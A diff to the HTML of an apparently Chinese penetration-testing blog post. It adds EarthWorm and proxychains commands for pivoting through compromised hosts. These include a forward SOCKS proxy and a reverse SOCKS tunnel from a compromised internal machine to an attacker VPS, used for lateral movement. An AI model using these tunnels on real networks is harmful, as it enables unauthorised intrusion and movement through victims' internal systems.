@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">178</span>
+            <span class="post-count">487</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -122,6 +122,41 @@
 <p>启动 frpc -c frpc.ini</p>
 <hr>
 <p>但是我们知道此工具会被免杀掉，所以还可以用其他的方式</p>
+<h2 id="earthworm-proxychains"><a href="#earthworm-proxychains" class="headerlink" title="earthworm+proxychains"></a>earthworm+proxychains</h2><h3 id="ssocksd正向代理"><a href="#ssocksd正向代理" class="headerlink" title="ssocksd正向代理"></a>ssocksd正向代理</h3><h4 id="内网攻击机–-gt-失陷公网主机"><a href="#内网攻击机–-gt-失陷公网主机" class="headerlink" title="内网攻击机–&gt;失陷公网主机"></a>内网攻击机–&gt;失陷公网主机</h4><p>我们拿下的是一台公网机器shell，该机器有内网网卡，与内网相通。通过在失陷公网添加代理，对内网资产进行探测。</p>
+<ul>
+<li>失陷公网主机（跳板机）</li>
+</ul>
+<p>./ew  -s  ssocksd  -l  10010       //在10010端口开启socks代理，</p>
+<ul>
+<li>kali</li>
+</ul>
+<p>vi /etc/proxychains.conf</p>
+<p>注释掉socks4，添加</p>
+<p>socks4  35.34.xx.xx  10010</p>
+<h3 id="rssocksd-rcscocksd反向代理"><a href="#rssocksd-rcscocksd反向代理" class="headerlink" title="rssocksd  rcscocksd反向代理"></a>rssocksd  rcscocksd反向代理</h3><p>####内网攻击机-公网vps-&gt;受陷内网</p>
+<p>场景就是我们通过某些服务直接拿下了内网一台机器，该机器只是通过映射某些端口对外网，能够提供相应服务。</p>
+<p>我们需要通过socks5反向代理将流量带进内网，进行内网探测。</p>
+<p>kali                             192.168.1.101</p>
+<p>vps                              35.34.xx.xx</p>
+<p>内网失陷主机             192.168.119.20</p>
+<ul>
+<li>内网失陷主机 </li>
+</ul>
+<p>ew_for_win_32.exe-s rssocks -d 35.34.xx.xx -e 1024</p>
+<p>反向代理连接公网服务器。</p>
+<ul>
+<li>vps</li>
+</ul>
+<p>./ew_for_linux-s -rcsocks -l 1010 -e 1024</p>
+<p>监听1024端口，等内网反弹。监听1010等本机访问</p>
+<ul>
+<li>kali</li>
+</ul>
+<p>vi /etc/proxychains.conf</p>
+<p>socks5 35.34.xx.xx 1010</p>
+<hr>
+<p>kali里面的命令前面加个proxychains即可使用，然后就是对内网横向渗透了。</p>
+<p>攻击机内网</p>
  
       <!-- reward -->
       
